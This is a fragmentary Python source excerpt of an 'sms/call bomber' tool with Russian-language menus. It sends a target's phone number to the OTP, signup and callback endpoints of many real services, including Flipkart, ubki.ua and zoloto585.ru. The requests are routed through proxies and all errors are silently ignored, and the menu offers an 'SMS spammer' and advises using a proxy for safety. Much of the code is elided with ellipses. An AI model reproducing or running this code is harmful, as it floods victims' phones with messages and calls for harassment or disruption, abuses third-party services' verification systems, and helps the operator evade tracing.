...
def MAIN():
	try:
		...
		def Main():
			...
			def sms():
				...
				try:
					try:
						...
						requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, proxies=proxies, timeout=1)
					except:
						pass
					try:
						requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, proxies=proxies, timeout=1)
					except:
						pass
					try:
						phonee=mask(str=phone[1:], maska="8(###)###-##-##")
						requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=1)
					except:
						pass
					try:
					...
					try:
						...
						pass
					try:
						requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"}, proxies=proxies, timeout=1)
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
					...
					try:
						...
						pass
					try:
						requests.post("https://www.flipkart.com/api/5/user/otp/generate",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": "+"+phone}, proxies=proxies, timeout=1)
					except:
						pass
					try:
						requests.post("https://www.flipkart.com/api/6/user/signup/status",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},json={"loginId": "+"+phone, "supportAllStates": True}, proxies=proxies, timeout=1)
					except:
						pass
					try:
			...
			def logo():
				logo = "sms/call bomber. создано maximuspro/maximus proyt/hfs/logigitex/maximplohih"
				...
				try:
					if int(phone):
						...
						try:
							...
							info=Fore.RED+"неправильно"+Style.RESET_ALL
				except:
					info=Fore.RED+"неправиль"+Style.RESET_ALL
			...
			def main():
				...
				while True:
					...
					if proxy == "localhost":
						print(Fore.YELLOW+"надо использовать proxy для безопасности"+Style.RESET_ALL)
					print("1) СМС спамер.")
